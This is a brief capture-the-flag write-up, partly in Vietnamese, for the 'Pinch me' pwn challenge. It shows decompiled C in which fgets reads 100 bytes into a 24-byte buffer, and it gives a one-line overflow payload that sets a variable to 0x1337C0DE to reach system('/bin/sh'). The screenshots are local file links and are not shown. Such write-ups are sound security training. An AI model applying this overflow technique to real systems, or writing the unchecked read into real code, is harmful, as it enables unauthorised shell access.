![pinch_me](C:\Users\vietd\OneDrive - actvn.edu.vn\MyWriteUp\VietAT16-Task_KCSC\dCTF\pwn\Pinch me\imgs\pinch_me.png)

Hàm **main** sẽ gọi đến hàm **vuln**. 

Pseudocode of **vuln** func:

```c
int vuln()
{
  char s[24];
  int v2;
  int v3;

  v3 = 0x1234567;
  v2 = 0x89ABCDEF;
  puts("Is this a real life, or is it just a fanta sea?");
  puts("Am I dreaming?");
  fgets(s, 100, stdin);
  if ( v2 == 0x1337C0DE )
    return system("/bin/sh"); 		// your target
  if ( v3 == 0x1234567 )
    return puts("Pinch me!");
  return puts("Pinch me harder!");

```

Ta cần overwrite biến v2 = 0x1337C0DE là done

![stack](C:\Users\vietd\OneDrive - actvn.edu.vn\MyWriteUp\VietAT16-Task_KCSC\dCTF\pwn\Pinch me\imgs\stack.png)

payload = 'A' * 24 + '\xde\xc0\x37\x13'

![flag](C:\Users\vietd\OneDrive - actvn.edu.vn\MyWriteUp\VietAT16-Task_KCSC\dCTF\pwn\Pinch me\imgs\flag.png)

